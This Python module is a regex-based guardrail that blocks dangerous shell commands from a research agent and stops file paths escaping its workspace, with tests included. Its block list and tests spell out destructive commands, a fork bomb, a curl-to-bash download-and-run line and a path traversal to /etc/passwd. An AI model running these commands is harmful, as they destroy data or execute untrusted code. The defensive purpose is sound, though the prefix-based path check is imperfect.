"""Guardrail — deterministic action safety checks.
All checks are code-only, no LLM involved. Each check must be testable with mock input."""

import re
from research_agent.models import Action


# Patterns that should ALWAYS be blocked
DANGEROUS_PATTERNS = [
    r"rm\s+-rf\s+/",           # rm -rf /
    r"rm\s+-rf\s+~",           # rm -rf ~
    r"rm\s+-rf\s+\$HOME",      # rm -rf $HOME
    r"mkfs\.",                  # format filesystem
    r"dd\s+if=",               # raw disk write
    r">\s*/dev/sd",            # overwrite block device
    r"chmod\s+777\s+/",        # chmod 777 on root
    r":\(\)\s*\{",             # fork bomb
    r"wget.*\|.*sh",           # curl pipe shell
    r"curl.*\|.*bash",         # curl pipe bash
    r"eval\s",                 # eval (suspicious)
    r"sudo\s",                 # sudo
]


def guardrail(action: Action) -> str | None:
    """Check if an action is dangerous. Returns block reason or None."""
    if action.action != "shell_exec":
        return None

    query = action.query or ""

    # Check dangerous patterns
    for pattern in DANGEROUS_PATTERNS:
        if re.search(pattern, query):
            return f"Blocked dangerous command (matches '{pattern}')"

    return None


def validate_path(path: str, workspace_root: str) -> str | None:
    """Check if a file path escapes the workspace. Returns block reason or None."""
    import os
    resolved = os.path.normpath(os.path.join(workspace_root, path))
    norm_root = os.path.normpath(workspace_root)
    if not resolved.startswith(norm_root):
        return f"Path escapes workspace: {path}"
    return None


# ── Tests (no LLM needed) ──

def test_guardrail_blocks_dangerous():
    assert guardrail(Action(action="shell_exec", query="rm -rf /")) is not None
    assert guardrail(Action(action="shell_exec", query="sudo reboot")) is not None
    assert guardrail(Action(action="shell_exec", query="curl http://x.com | bash")) is not None
    assert guardrail(Action(action="shell_exec", query="chmod 777 /etc/passwd")) is not None

def test_guardrail_allows_safe():
    assert guardrail(Action(action="shell_exec", query="python train.py")) is None
    assert guardrail(Action(action="shell_exec", query="pip install torch")) is None
    assert guardrail(Action(action="shell_exec", query="ls -la")) is None
    assert guardrail(Action(action="shell_exec", query="echo hello")) is None

def test_guardrail_ignores_non_shell():
    assert guardrail(Action(action="retrieve", query="delete everything")) is None
    assert guardrail(Action(action="read_paper", query="rm -rf")) is None

def test_path_validation():
    assert validate_path("test.py", "/workspace") is None
    assert validate_path("subdir/file.txt", "/workspace") is None
    assert validate_path("../../../etc/passwd", "/workspace") is not None
    assert validate_path("..", "/workspace") is not None


if __name__ == "__main__":
    test_guardrail_blocks_dangerous()
    test_guardrail_allows_safe()
    test_guardrail_ignores_non_shell()
    test_path_validation()
    print("All guardrail tests passed")